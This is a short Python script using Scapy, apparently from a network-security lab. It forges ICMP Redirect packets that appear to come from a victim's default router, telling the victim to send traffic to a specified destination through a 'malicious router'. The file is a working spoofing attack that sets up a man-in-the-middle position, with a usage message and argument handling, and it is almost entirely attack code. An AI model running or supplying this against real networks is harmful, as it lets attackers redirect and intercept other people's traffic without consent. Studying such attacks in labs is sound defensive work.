#!/usr/bin/env python3
# this program simply spoofs a ICMP Redirect to victim to send the pkt to itself
# Assuming this program runs on A (172.21.4.199) and spoofs with following
# victim: 172.21.4.5 (argv[1],
# victim default router: 172.21.4.254 (argv[2])
# Malicious router: 172.21.4.252 (argv[3])
# -------------------------------
import sys
from scapy.all import *
import time

if len(sys.argv) != 6:
  print("Usage: sys.argv[0]\n" 
         + "<victim IP> \n" 
         + "<victim's router IP>\n" 
         + "<malicious router IP>\n" 
         + "<destination host IP>\n"
         + "<icmp id>"
         )
  exit()

victim_ip = sys.argv[1]
victim_router = sys.argv[2]
malicious_router = sys.argv[3]
dstn_ip = sys.argv[4]
icmp_org_id = int(sys.argv[5])

outer = IP(src=victim_router, dst=victim_ip)
redirect = ICMP(type=5, code=1) # ICMP Redirect message
redirect.gw = malicious_router
inner = IP(src=victim_ip, dst=dstn_ip, flags='DF')/ICMP(id=icmp_org_id, seq=3)/Raw(b'X'*56)
#pkt = outer/redirect/inner/ICMP() # Assumption, victim is sending ICMP pkts
pkt = outer/redirect/Raw(raw(inner))

for i in range(2):
  send(pkt,verbose=1)
  time.sleep(0.5)
